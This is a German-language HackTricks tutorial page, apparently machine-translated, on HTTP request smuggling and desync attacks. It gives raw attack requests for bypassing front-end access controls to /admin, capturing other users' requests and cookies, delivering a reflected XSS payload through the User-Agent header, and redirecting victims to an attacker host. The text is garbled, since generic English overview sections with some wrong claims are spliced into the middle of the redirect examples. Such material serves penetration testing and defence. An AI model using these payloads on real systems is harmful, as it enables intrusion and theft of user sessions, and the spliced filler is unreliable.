# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Was ist

Diese Schwachstelle tritt auf, wenn eine **Desynchronisierung** zwischen **Front-End-Proxies** und dem **Back-End-Server** es einem **Angreifer erm√∂glicht**, eine HTTP-Anfrage zu senden, die von den **Front-End-Proxies** (Load Balancer/Reverse Proxy) als **eine einzelne Anfrage** und vom **Back-End-Server als zwei Anfragen** interpretiert wird.\
Dies erm√∂glicht es einem Benutzer, die n√§chste Anfrage zu modifizieren, die beim Back-End-Server nach seiner Anfrage eintrifft.

### Theorie

[**RFC-Spezifikation (2161)**](https://tools.ietf.org/html/rfc2616)

> Wenn eine Nachricht sowohl ein Transfer-Encoding-Headerfeld als auch ein Content-Length-Headerfeld enth√§lt, muss das letztere ignoriert werden.

**Content-Length**

> Der Content-Length-Header des Entit√§tsk√∂rpers gibt die Gr√∂√üe des Entit√§tsk√∂rpers in Bytes an, die an den Empf√§nger gesendet werden.

**Transfer-Encoding: chunked**

> Der Transfer-Encoding-Header gibt die Art der Codierung an, die zum sicheren √úbertragen des Nutzdatenk√∂rpers an den Benutzer verwendet wird.\
> Chunked bedeutet, dass gro√üe Daten in einer Reihe von Chunks gesendet werden.

### Realit√§t

Das **Front-End** (ein Load Balancer/Reverse Proxy) **verarbeitet** den _**Content-Length**_- oder den _**Transfer-Encoding**_-Header und der **Back-End-Server verarbeitet den anderen**, was zu einer **Desynchronisierung** zwischen den beiden Systemen f√ºhrt.\
Dies kann sehr kritisch sein, da **ein Angreifer eine Anfrage** an den Reverse Proxy senden kann, die vom **Back-End-Server als zwei verschiedene Anfragen interpretiert wird**. Die **Gefahr** dieser Technik besteht darin, dass der **Back-End-Server die injizierte 2. Anfrage** so interpretiert, als k√§me sie vom n√§chsten Client, und die **echte Anfrage** dieses Clients Teil der **injizierten Anfrage** wird.

### Besonderheiten

Denken Sie daran, dass in HTTP **ein Zeilenumbruchszeichen aus 2 Bytes besteht**:

* **Content-Length**: Dieser Header verwendet eine **Dezimalzahl**, um die **Anzahl** der **Bytes** des **K√∂rpers** der Anfrage anzugeben. Der K√∂rper wird erwartungsgem√§√ü mit dem letzten Zeichen enden, **ein Zeilenumbruch ist am Ende der Anfrage nicht erforderlich**.
* **Transfer-Encoding:** Dieser Header verwendet in **K√∂rper** eine **hexadezimale Zahl**, um die **Anzahl** der **Bytes** des **n√§chsten Chunks** anzugeben. Der **Chunk** muss mit einem **Zeilenumbruch** enden, aber dieser Zeilenumbruch **wird nicht durch den L√§ngenindikator gez√§hlt**. Diese √úbertragungsmethode muss mit einem **Chunk der Gr√∂√üe 0 gefolgt von 2 Zeilenumbr√ºchen** enden: `0`
* **Connection**: Basierend auf meiner Erfahrung wird empfohlen, **`Connection: keep-alive`** f√ºr die erste Anfrage des Request Smuggling zu verwenden.

## Grundlegende Beispiele

HTTP Request Smuggling-Angriffe werden durch den Versand von mehrdeutigen Anfragen erstellt, die Diskrepanzen in der Interpretation der `Content-Length` (CL) und `Transfer-Encoding` (TE) Header zwischen Front-End- und Back-End-Servern ausnutzen. Diese Angriffe k√∂nnen sich in verschiedenen Formen manifestieren, haupts√§chlich als **CL.TE**, **TE.CL** und **TE.TE**. Jeder Typ repr√§sentiert eine einzigartige Kombination davon, wie die Front-End- und Back-End-Server diese Header priorisieren. Die Schwachstellen entstehen durch die unterschiedliche Verarbeitung der gleichen Anfrage durch die Server, was zu unerwarteten und potenziell b√∂sartigen Ergebnissen f√ºhrt.

### Grundlegende Beispiele f√ºr Schwachstellentypen

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Schwachstelle (Content-Length verwendet von Front-End, Transfer-Encoding verwendet von Back-End)
- **Front-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length`-Header.
- **Back-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding`-Header.
- **Angriffsszenario:**
- Der Angreifer sendet eine Anfrage, bei der der Wert des `Content-Length`-Headers nicht mit der tats√§chlichen L√§nge des Inhalts √ºbereinstimmt.
- Der Front-End-Server leitet die gesamte Anfrage basierend auf dem Wert von `Content-Length` an das Back-End weiter.
- Der Back-End-Server verarbeitet die Anfrage aufgrund des `Transfer-Encoding: chunked`-Headers als chunked und interpretiert die restlichen Daten als separate, nachfolgende Anfrage.
- **Beispiel:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Schwachstelle (Transfer-Encoding verwendet von Front-End, Content-Length verwendet von Back-End)
- **Front-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding`-Header.
- **Back-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length`-Header.
- **Angriffsszenario:**
- Der Angreifer sendet eine chunked-Anfrage, bei der die Chunk-Gr√∂√üe (`7b`) und die tats√§chliche L√§nge des Inhalts (`Content-Length: 4`) nicht √ºbereinstimmen.
- Der Front-End-Server leitet die gesamte Anfrage basierend auf `Transfer-Encoding` an das Back-End weiter.
- Der Back-End-Server verarbeitet nur den Anfang der Anfrage (`7b` Bytes) gem√§√ü `Content-Length` und l√§sst den Rest als Teil einer unbeabsichtigten nachfolgenden Anfrage.
- **Beispiel:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE-Schwachstelle (Transfer-Encoding von beiden mit Verschleierung verwendet)
- **Server:** Beide unterst√ºtzen `Transfer-Encoding`, aber einer kann durch Verschleierung dazu gebracht werden, es zu ignorieren.
- **Angriffsszenario:**
- Der Angreifer sendet eine Anfrage mit verschleierten `Transfer-Encoding`-Headern.
- Je nachdem, welcher Server (Front-End oder Back-End) die Verschleierung nicht erkennt, kann eine CL.TE- oder TE.CL-Schwachstelle ausgenutzt werden.
- Der nicht verarbeitete Teil der Anfrage, wie er von einem der Server gesehen wird, wird Teil einer nachfolgenden Anfrage und f√ºhrt zu Smuggling.
- **Beispiel:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL-Szenario (Content-Length von Front-End und Back-End verwendet):**
- Beide Server verarbeiten die Anfrage ausschlie√ülich anhand des `Content-Length`-Headers.
- Dieses Szenario f√ºhrt in der Regel nicht zu Smuggling, da beide Server die Anfragel√§nge gleich interpretieren.
- **Beispiel:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normale Anfrage
```

#### **CL != 0-Szenario:**
- Bezieht sich auf Szenarien, in denen der `Content-Length`-Header vorhanden ist und einen Wert ungleich Null hat, was darauf hinweist, dass der Anfragek√∂rper Inhalt hat.
- Es ist wichtig, Smuggling-Angriffe zu verstehen und zu erstellen, da dies beeinflusst, wie Server das Ende einer Anfrage bestimmen.
- **Beispiel:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Nicht leerer K√∂rper
```

#### Erzwingen √ºber Hop-by-Hop-Header

Durch Missbrauch von Hop-by-Hop-Headern k√∂nnen Sie den Proxy dazu veranlassen, **den Header Content-Length oder Transfer-Encoding zu l√∂schen, sodass ein HTTP-Anfrage-Smuggling missbraucht werden kann**.
```
Connection: Content-Length
```
F√ºr **weitere Informationen zu hop-by-hop-Headern** besuchen Sie:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Erkennen von HTTP Request Smuggling

Die Identifizierung von Schwachstellen bei HTTP Request Smuggling kann oft mithilfe von Timing-Techniken erfolgen, die darauf beruhen, wie lange der Server ben√∂tigt, um auf manipulierte Anfragen zu antworten. Diese Techniken sind besonders n√ºtzlich, um CL.TE- und TE.CL-Schwachstellen zu erkennen. Neben diesen Methoden gibt es auch andere Strategien und Tools, die verwendet werden k√∂nnen, um solche Schwachstellen zu finden:

### Auffinden von CL.TE-Schwachstellen mithilfe von Timing-Techniken
- **Methode:**
- Senden Sie eine Anfrage, die, wenn die Anwendung anf√§llig ist, dazu f√ºhrt, dass der Backend-Server auf zus√§tzliche Daten wartet.
- **Beispiel:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Beobachtung:**
- Der Frontend-Server verarbeitet die Anfrage basierend auf `Content-Length` und schneidet die Nachricht vorzeitig ab.
- Der Backend-Server, der eine chunked-Nachricht erwartet, wartet auf den n√§chsten Chunk, der jedoch nie ankommt und dadurch zu einer Verz√∂gerung f√ºhrt.

- **Indikatoren:**
- Timeouts oder lange Verz√∂gerungen bei der Antwort.
- Erhalt einer 400 Bad Request-Fehlermeldung vom Backend-Server, manchmal mit detaillierten Serverinformationen.

### Auffinden von TE.CL-Schwachstellen mithilfe von Timing-Techniken
- **Methode:**
- Senden Sie eine Anfrage, die, wenn die Anwendung anf√§llig ist, dazu f√ºhrt, dass der Backend-Server auf zus√§tzliche Daten wartet.
- **Beispiel:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Beobachtung:**
- Der Frontend-Server verarbeitet die Anfrage basierend auf `Transfer-Encoding` und leitet die gesamte Nachricht weiter.
- Der Backend-Server, der eine Nachricht basierend auf `Content-Length` erwartet, wartet auf zus√§tzliche Daten, die jedoch nie ankommen und dadurch zu einer Verz√∂gerung f√ºhren.

### Andere Methoden zum Auffinden von Schwachstellen
- **Differential Response Analysis:**
- Senden Sie leicht abgewandelte Versionen einer Anfrage und beobachten Sie, ob sich die Serverantworten auf unerwartete Weise unterscheiden, was auf eine Parsing-Diskrepanz hinweisen kann.

- **Verwendung automatisierter Tools:**
- Tools wie die Erweiterung "HTTP Request Smuggler" von Burp Suite k√∂nnen automatisch auf diese Schwachstellen testen, indem sie verschiedene Formen von mehrdeutigen Anfragen senden und die Antworten analysieren.

- **Tests zur Variation der Content-Length:**
- Senden Sie Anfragen mit unterschiedlichen `Content-Length`-Werten, die nicht mit der tats√§chlichen L√§nge des Inhalts √ºbereinstimmen, und beobachten Sie, wie der Server mit solchen Abweichungen umgeht.

- **Tests zur Variation der Transfer-Encoding:**
- Senden Sie Anfragen mit verschleierten oder fehlerhaften `Transfer-Encoding`-Headern und √ºberwachen Sie, wie unterschiedlich der Frontend- und Backend-Server auf solche Manipulationen reagieren.


### Testen von Schwachstellen bei HTTP Request Smuggling

Nachdem die Wirksamkeit von Timing-Techniken best√§tigt wurde, ist es entscheidend zu √ºberpr√ºfen, ob Client-Anfragen manipuliert werden k√∂nnen. Eine einfache Methode besteht darin, Ihre Anfragen zu manipulieren, zum Beispiel indem Sie eine Anfrage an `/` senden, die eine 404-Antwort liefert. Die zuvor diskutierten `CL.TE`- und `TE.CL`-Beispiele in [Grundlegende Beispiele](./#basic-examples) zeigen, wie man eine Anfrage des Clients manipuliert, um eine 404-Antwort zu erhalten, obwohl der Client versucht, auf eine andere Ressource zuzugreifen.

**Wichtige √úberlegungen**

Beim Testen von Schwachstellen bei Request Smuggling durch Eingriffe in andere Anfragen sollten Sie beachten:

* **Unterschiedliche Netzwerkverbindungen:** Die "Angriffs-" und "normalen" Anfragen sollten √ºber separate Netzwerkverbindungen gesendet werden. Die Verwendung derselben Verbindung f√ºr beide Anfragen best√§tigt nicht das Vorhandensein der Schwachstelle.
* **Konsistente URL und Parameter:** Versuchen Sie, f√ºr beide Anfragen identische URLs und Parameter-Namen zu verwenden. Moderne Anwendungen leiten Anfragen oft an bestimmte Backend-Server weiter, basierend auf URL und Parametern. Wenn diese √ºbereinstimmen, erh√∂ht sich die Wahrscheinlichkeit, dass beide Anfragen vom selben Server verarbeitet werden, was eine Voraussetzung f√ºr einen erfolgreichen Angriff ist.
* **Timing und Rennbedingungen:** Die "normale" Anfrage, die dazu dient, St√∂rungen durch die "Angriffs-"Anfrage zu erkennen, konkurriert mit anderen gleichzeitigen Anfragen der Anwendung. Senden Sie daher die "normale" Anfrage unmittelbar nach der "Angriffs-"Anfrage. Bei stark ausgelasteten Anwendungen kann es erforderlich sein, mehrere Versuche durchzuf√ºhren, um eine eindeutige Best√§tigung der Schwachstelle zu erhalten.
* **Herausforderungen bei der Lastverteilung:** Frontend-Server, die als Lastausgleicher fungieren, k√∂nnen Anfragen auf verschiedene Backend-Systeme verteilen. Wenn die "Angriffs-" und "normale" Anfragen auf unterschiedlichen Systemen landen, wird der Angriff nicht erfolgreich sein. Dieser Aspekt der Lastverteilung kann mehrere Versuche erfordern, um eine Schwachstelle zu best√§tigen.
* **Unbeabsichtigte Auswirkungen auf Benutzer:** Wenn Ihr Angriff unbeabsichtigt die Anfrage eines anderen Benutzers beeinflusst (nicht die "normale" Anfrage, die Sie zur Erkennung gesendet haben), deutet dies darauf hin, dass Ihr Angriff einen anderen Anwendungsnutzer beeinflusst hat. Kontinuierliche Tests k√∂nnten andere Benutzer st√∂ren, daher ist eine vorsichtige Vorgehensweise erforderlich.


## Missbrauch von HTTP Request Smuggling

### Um Front-End-Sicherheitskontrollen zu umgehen

### Umgehung der Front-End-Sicherheit √ºber HTTP Request Smuggling

Manchmal setzen Front-End-Proxys Sicherheitsma√ünahmen durch, indem sie eingehende Anfragen √ºberpr√ºfen. Diese Ma√ünahmen k√∂nnen jedoch durch den Missbrauch von HTTP Request Smuggling umgangen werden, was einen unbefugten Zugriff auf eingeschr√§nkte Endpunkte erm√∂glicht. Zum Beispiel kann der Zugriff auf `/admin` extern untersagt sein, wobei der Front-End-Proxy solche Versuche aktiv blockiert. Dieser Proxy kann jedoch vers√§umen, eingebettete Anfragen innerhalb einer geschmuggelten HTTP-Anfrage zu √ºberpr√ºfen, was eine Schlupfloch f√ºr die Umgehung dieser Einschr√§nkungen darstellt.

Die folgenden Beispiele verdeutlichen, wie HTTP Request Smuggling verwendet werden kann, um Front-End-Sicherheitskontrollen zu umgehen und speziell den `/admin`-Pfad anzugreifen, der normalerweise vom Front-End-Proxy gesch√ºtzt wird:

**CL.TE-Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Im CL.TE-Angriff wird der `Content-Length`-Header f√ºr die erste Anfrage genutzt, w√§hrend die nachfolgende eingebettete Anfrage den Header `Transfer-Encoding: chunked` verwendet. Der Front-End-Proxy verarbeitet die erste `POST`-Anfrage, √ºberpr√ºft jedoch nicht die eingebettete `GET /admin`-Anfrage, was einen unbefugten Zugriff auf den Pfad `/admin` erm√∂glicht.

**TE.CL Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Im Gegensatz dazu verwendet der TE.CL-Angriff bei der anf√§nglichen `POST`-Anfrage `Transfer-Encoding: chunked`, und die nachfolgende eingebettete Anfrage wird auf der Grundlage des `Content-Length`-Headers verarbeitet. √Ñhnlich wie beim CL.TE-Angriff √ºbersieht der Front-End-Proxy die geschmuggelte `GET /admin`-Anfrage und gew√§hrt versehentlich Zugriff auf den eingeschr√§nkten `/admin`-Pfad.

### Offenlegung der Umleitung von Front-End-Anfragen <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Anwendungen verwenden oft einen **Front-End-Server**, um eingehende Anfragen vor der Weiterleitung an den Back-End-Server zu modifizieren. Eine typische Modifikation besteht darin, Header wie `X-Forwarded-For: <IP des Clients>` hinzuzuf√ºgen, um die IP des Clients an das Back-End weiterzuleiten. Das Verst√§ndnis dieser Modifikationen kann entscheidend sein, da dies m√∂glicherweise M√∂glichkeiten zum **Umgehen von Schutzma√ünahmen** oder zum **Aufdecken verborgener Informationen oder Endpunkte** aufzeigt.

Um zu untersuchen, wie ein Proxy eine Anfrage √§ndert, suchen Sie nach einem POST-Parameter, der vom Back-End in der Antwort wiedergegeben wird. Erstellen Sie dann eine Anfrage, wobei dieser Parameter zuletzt verwendet wird, √§hnlich wie folgendes Beispiel:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In dieser Struktur werden nach `search=` die nachfolgenden Anforderungskomponenten angeh√§ngt, die im Antworttext reflektiert werden. Diese Reflexion gibt die Header der nachfolgenden Anfrage preis.

Es ist wichtig, den `Content-Length`-Header der verschachtelten Anfrage mit der tats√§chlichen Inhaltsl√§nge abzustimmen. Es ist ratsam, mit einem kleinen Wert zu beginnen und allm√§hlich zu erh√∂hen, da ein zu niedriger Wert die reflektierten Daten abschneidet, w√§hrend ein zu hoher Wert dazu f√ºhren kann, dass die Anfrage einen Fehler verursacht.

Diese Technik ist auch im Zusammenhang mit einer TE.CL-Schwachstelle anwendbar, aber die Anfrage sollte mit `search=\r\n0` enden. Unabh√§ngig von den Zeilenumbr√ºchen werden die Werte an den Suchparameter angeh√§ngt.

Diese Methode dient in erster Linie dazu, die von der Front-End-Proxy vorgenommenen Anpassungen an der Anfrage zu verstehen und eine selbstgerichtete Untersuchung durchzuf√ºhren.

### Erfassen von Anfragen anderer Benutzer <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es ist m√∂glich, die Anfragen des n√§chsten Benutzers zu erfassen, indem man w√§hrend einer POST-Operation eine spezifische Anfrage als Wert eines Parameters anh√§ngt. So kann dies erreicht werden:

Durch Anh√§ngen der folgenden Anfrage als Wert eines Parameters k√∂nnen Sie die Anfrage des nachfolgenden Clients speichern:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In diesem Szenario ist der **Kommentarparameter** dazu gedacht, den Inhalt innerhalb des Kommentarbereichs eines √∂ffentlich zug√§nglichen Beitrags zu speichern. Folglich wird der Inhalt des nachfolgenden Requests als Kommentar angezeigt.

Diese Technik hat jedoch ihre Grenzen. Im Allgemeinen erfasst sie nur Daten bis zum Parameter-Trennzeichen, das im geschmuggelten Request verwendet wird. Bei URL-codierten Formulareingaben ist dieses Trennzeichen das `&`-Zeichen. Das bedeutet, dass der erfasste Inhalt des Requests des Opferbenutzers am ersten `&` endet, das m√∂glicherweise sogar Teil der Query-String ist.

Dar√ºber hinaus ist es erw√§hnenswert, dass dieser Ansatz auch bei einer TE.CL-Schwachstelle m√∂glich ist. In solchen F√§llen sollte der Request mit `search=\r\n0` enden. Unabh√§ngig von Zeilenumbr√ºchen werden die Werte an den Suchparameter angeh√§ngt.

### Verwendung von HTTP Request Smuggling zur Ausnutzung von reflektiertem XSS

HTTP Request Smuggling kann genutzt werden, um Webseiten anf√§llig f√ºr **reflektiertes XSS** auszunutzen und bietet erhebliche Vorteile:

* Es ist **keine Interaktion** mit den Zielbenutzern erforderlich.
* Erm√∂glicht die Ausnutzung von XSS in Teilen des Requests, die normalerweise **nicht erreichbar** sind, wie z.B. den HTTP Request Headern.

In Szenarien, in denen eine Website anf√§llig f√ºr reflektiertes XSS √ºber den User-Agent-Header ist, zeigt das folgende Payload, wie diese Schwachstelle ausgenutzt werden kann:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Diese Payload ist so strukturiert, dass die Schwachstelle ausgenutzt wird, indem:

1. Ein `POST`-Request initiiert wird, der scheinbar typisch ist, mit einem `Transfer-Encoding: chunked`-Header, um den Beginn des Smugglings anzuzeigen.
2. Anschlie√üend wird eine `0` verwendet, um das Ende des chunked Nachrichtenrumpfs zu markieren.
3. Dann wird ein geschmuggelter `GET`-Request eingef√ºhrt, bei dem der `User-Agent`-Header mit einem Skript, `<script>alert(1)</script>`, injiziert wird, das das XSS ausl√∂st, wenn der Server diesen nachfolgenden Request verarbeitet.

Durch die Manipulation des `User-Agent` mittels Smuggling umgeht die Payload normale Request-Beschr√§nkungen und nutzt somit die Reflected XSS-Schwachstelle auf eine nicht standardm√§√üige, aber effektive Weise aus.

### Verwendung von HTTP Request Smuggling, um eine On-Site-Weiterleitung in eine offene Weiterleitung umzuwandeln <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Ausnutzen von On-Site-Weiterleitungen mit HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Anwendungen leiten oft von einer URL zu einer anderen weiter, indem sie den Hostnamen aus dem `Host`-Header in der Weiterleitungs-URL verwenden. Dies ist bei Webservern wie Apache und IIS √ºblich. Wenn beispielsweise ein Ordner ohne abschlie√üenden Schr√§gstrich angefordert wird, erfolgt eine Weiterleitung, um den Schr√§gstrich einzuschlie√üen:
```
GET /home HTTP/1.1
Host: normal-website.com
```
# HTTP Request Smuggling

HTTP Request Smuggling is a technique that allows an attacker to manipulate the way a web application parses and interprets HTTP requests. By exploiting inconsistencies in how different components handle these requests, an attacker can bypass security measures and potentially perform various attacks, such as session hijacking, privilege escalation, or remote code execution.

## How it works

HTTP Request Smuggling typically involves sending specially crafted HTTP requests that exploit differences in how the front-end server (e.g., a load balancer or reverse proxy) and the back-end server (e.g., an application server) interpret the request headers. The goal is to trick the front-end server into forwarding the request in a way that the back-end server interprets it differently.

The attack usually relies on two main techniques: **header smuggling** and **body smuggling**.

### Header Smuggling

Header smuggling involves manipulating the Content-Length and Transfer-Encoding headers to confuse the front-end and back-end servers. By carefully crafting the headers, an attacker can make the front-end server interpret the request as multiple requests, while the back-end server interprets it as a single request. This can lead to various security vulnerabilities, such as request smuggling, cache poisoning, or bypassing security controls.

### Body Smuggling

Body smuggling, also known as **chunked request smuggling**, exploits the way the back-end server handles chunked encoding. By sending specially crafted requests with inconsistent chunked encoding, an attacker can trick the back-end server into misinterpreting the request boundaries. This can result in various security issues, such as request smuggling, cache poisoning, or remote code execution.

## Detection and Prevention

Detecting and preventing HTTP Request Smuggling attacks can be challenging due to the complex nature of the attack and the various components involved. However, there are some measures that can help mitigate the risk:

- Implementing strict parsing and validation of HTTP requests at both the front-end and back-end servers.
- Keeping all software components up to date to ensure they are not vulnerable to known HTTP Request Smuggling techniques.
- Using a Web Application Firewall (WAF) or Intrusion Detection System (IDS) that can detect and block suspicious HTTP traffic.
- Conducting regular security assessments and penetration testing to identify and address any vulnerabilities in the web application.

It is important to note that prevention measures alone may not be sufficient, as new HTTP Request Smuggling techniques are constantly being discovered. Therefore, it is crucial to stay informed about the latest attack vectors and security best practices to effectively protect web applications from this type of attack.

For more information and detailed examples of HTTP Request Smuggling techniques, refer to the [HTTP Request Smuggling section](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling) in the HackTricks book.
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Obwohl dieses Verhalten scheinbar harmlos ist, kann es mithilfe von HTTP-Request-Smuggling manipuliert werden, um Benutzer auf eine externe Website umzuleiten. Zum Beispiel:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Diese geschmuggelte Anfrage k√∂nnte dazu f√ºhren, dass die n√§chste verarbeitete Benutzeranfrage auf eine von einem Angreifer kontrollierte Website umgeleitet wird:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
# HTTP Request Smuggling

HTTP Request Smuggling is a technique that allows an attacker to manipulate the way a web application parses and interprets HTTP requests. By exploiting inconsistencies in how different components handle these requests, an attacker can bypass security measures and potentially perform various attacks, such as session hijacking, privilege escalation, or remote code execution.

## How it works

HTTP Request Smuggling typically involves sending specially crafted HTTP requests that exploit differences in how the front-end server (e.g., a load balancer or reverse proxy) and the back-end server (e.g., an application server) interpret the request headers. The goal is to trick the front-end server into forwarding the request in a way that the back-end server interprets it differently.

The attack usually relies on two main techniques:

1. **HTTP Request Smuggling via Content-Length**: In this technique, the attacker manipulates the `Content-Length` header to confuse the front-end server into treating multiple requests as a single request or vice versa. This can lead to request smuggling vulnerabilities, such as HTTP request smuggling or HTTP desync attacks.

2. **HTTP Request Smuggling via Transfer-Encoding**: This technique involves manipulating the `Transfer-Encoding` header to trick the front-end server into misinterpreting the request boundaries. By combining different transfer encodings, such as `chunked` and `identity`, an attacker can smuggle requests and potentially bypass security controls.

## Exploitation

To exploit HTTP Request Smuggling vulnerabilities, an attacker needs to carefully craft the HTTP requests to trigger the desired behavior in the front-end and back-end servers. This often requires understanding the specific behavior of the target application and experimenting with different payloads and techniques.

The exploitation process typically involves the following steps:

1. **Identify potential request smuggling points**: Analyze the target application's architecture and identify components that may introduce inconsistencies in request handling, such as load balancers, reverse proxies, or caching servers.

2. **Craft malicious HTTP requests**: Create specially crafted HTTP requests that exploit the identified request smuggling points. This may involve manipulating headers, request methods, or other request attributes.

3. **Send the requests and observe the behavior**: Send the crafted requests to the target application and observe how the front-end and back-end servers handle them. Look for any discrepancies or unexpected behavior that may indicate a request smuggling vulnerability.

4. **Exploit the vulnerability**: Once a request smuggling vulnerability is identified, exploit it to perform various attacks, such as session hijacking, privilege escalation, or remote code execution. The specific exploitation technique will depend on the nature of the vulnerability and the target application.

## Mitigation

To mitigate HTTP Request Smuggling attacks, it is important to follow secure coding practices and implement appropriate security controls. Some mitigation techniques include:

- **Request sanitization**: Implement strict input validation and sanitization mechanisms to prevent malicious requests from reaching the back-end server.

- **Consistent request handling**: Ensure consistent request handling across all components involved in request processing, such as load balancers, reverse proxies, and application servers.

- **Security headers**: Implement security headers, such as `Content-Length` and `Transfer-Encoding` validation, to detect and prevent request smuggling attacks.

- **Regular security testing**: Conduct regular security testing, including penetration testing and vulnerability scanning, to identify and address any request smuggling vulnerabilities.

By implementing these mitigation techniques, organizations can reduce the risk of HTTP Request Smuggling attacks and protect their web applications from potential exploitation.
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In diesem Szenario wird die Anfrage eines Benutzers nach einer JavaScript-Datei abgefangen. Der Angreifer kann potenziell den Benutzer gef√§hrden, indem er b√∂sartigen JavaScript-Code als Antwort bereitstellt.


### Verwendung von HTTP-Request-Smuggling zur Durchf√ºhrung von Web-Cache-Vergiftung <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

